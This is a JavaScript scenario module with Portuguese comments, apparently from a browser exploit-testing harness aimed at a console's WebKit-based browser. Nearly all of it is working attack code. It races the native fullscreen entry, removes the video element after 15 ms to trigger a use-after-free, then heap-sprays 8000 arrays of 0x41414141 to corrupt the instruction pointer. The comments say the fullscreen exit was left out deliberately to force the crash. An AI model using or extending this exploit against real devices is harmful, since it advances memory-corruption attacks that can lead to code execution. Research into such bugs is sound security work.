/**
 * CENÁRIO: VIDEO_FULLSCREEN_ENTRANCE_CRASH
 * Alvo: Race Condition durante a alocação de memória do Manx na ENTRADA do Fullscreen
 */

export default {
    id:       'VIDEO_FULLSCREEN_ENTRANCE_CRASH',
    category: 'Media',
    risk:     'CRITICAL',
    description: 'Foco exclusivo no CRASH: Corre contra a entrada do Fullscreen. ' +
                 'Remove o vídeo exatamente durante a transição de entrada nativa do Manx ' +
                 'e faz o spray massivo para corromper o RIP.',

    setup: async function() {
        this.container = document.createElement('div');
        document.body.appendChild(this.container);
        
        this.video = document.createElement('video');
        this.video.src = 'data:video/mp4;base64,AAAAFGZ0eXBtcDQyAAAAAG1wNDIAAAAIZnJlZQAAAAhtZGF0';
        this.video.controls = true;
        this.container.appendChild(this.video);

        // A munição: 0x41414141 (AAAA) - O gatilho perfeito para o Crash
        this.sprayPayload = new Uint32Array(256);
        this.sprayPayload.fill(0x41414141);

        await new Promise(resolve => {
            const timeout = setTimeout(resolve, 400);
            this.video.addEventListener('loadedmetadata', () => {
                clearTimeout(timeout);
                resolve();
            }, { once: true });
        });
    },

    trigger: async function() {
        try {
            // 1. INICIA A ENTRADA NO FULLSCREEN NATIVO
            if (this.video.webkitEnterFullscreen) {
                this.video.webkitEnterFullscreen();
            } else if (this.video.webkitRequestFullscreen) {
                this.video.webkitRequestFullscreen();
            }

            // 2. A JANELA CRÍTICA (RACE CONDITION)
            // Em vez de esperar 400ms, esperamos apenas 15ms! 
            // Queremos apanhar o C++ a MEIO da alocação do ecrã inteiro.
            await new Promise(r => setTimeout(r, 15)); 

            // 3. FREE: Puxamos o tapete enquanto o C++ ainda está a trabalhar!
            this.video.remove();

            // 4. SPRAY AGRESSIVO: Enchemos o buraco imediatamente.
            // Quando a função de entrada do Fullscreen tentar ler a memória para 
            // concluir o trabalho, vai ler 0x41414141 e Crashar.
            this.spray = [];
            for (let i = 0; i < 8000; i++) { // Spray aumentado para 8000
                let arr = new Uint32Array(256);
                arr.set(this.sprayPayload);
                this.spray.push(arr);
            }

            // ATENÇÃO: Retiramos propositadamente o webkitExitFullscreen. 
            // Queremos que a consola bata de frente com a corrupção.

        } catch(e) {}
    },

    probe: [
        // Mantemos probes mínimas. Se o crash não ocorrer instantaneamente, 
        // isto tenta aceder ao lixo que deixámos para forçar o erro.
        s => s.video.videoWidth,
        s => s.video.webkitDecodedFrameCount
    ],

    cleanup: function() {
        try { this.container.remove(); } catch(e) {}
        this.spray = null;
    }
};
